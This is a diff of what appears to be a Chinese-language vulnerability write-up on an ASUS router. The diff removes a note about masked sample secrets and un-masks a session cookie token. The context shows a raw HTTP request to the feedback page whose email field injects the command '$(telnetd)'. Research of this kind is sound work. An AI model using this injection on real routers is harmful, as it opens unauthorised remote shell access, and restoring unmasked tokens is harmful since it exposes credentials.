@@ -38,7 +38,6 @@ source_status: "recorded"
 - 20336泛描述堆溢出与实际栈数组越界不匹配；Python2字串脚本未标版本
 - 登录cookie呈现但20334权限条件未明确
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -126,7 +125,7 @@ DNT: 1
 Referer: http://192.168.1.1/Advanced_Feedback.asp
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
-Cookie: asus_token=jrP*************************zVc; clickedItem_tab=6
+Cookie: asus_token=jrPgm5H7TNyhlpOT2CUonTvPLBX3zVc; clickedItem_tab=6
 Connection: close
 
 preferred_lang=CN¤t_page=Advanced_Feedback.asp&action_mode=apply&action_script=restart_sendmail&action_wait=60&PM_attach_syslog=0&PM_attach_cfgfile=0&PM_attach_iptables=&PM_attach_modemlog=0&PM_attach_wlanlog=0&feedbackresponse=&fb_experience=&fb_browserInfo=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F64.0.3282.186+Safari%2F537.36&fb_transid=E7B1B39C7A501054&fb_country=eee&fb_email=test%40test.com|$(telnetd)&dblog_enable=0&fb_ptype=No_selected&fb_pdesc=others&fb_comment=trwetwe3r&msglength=1991
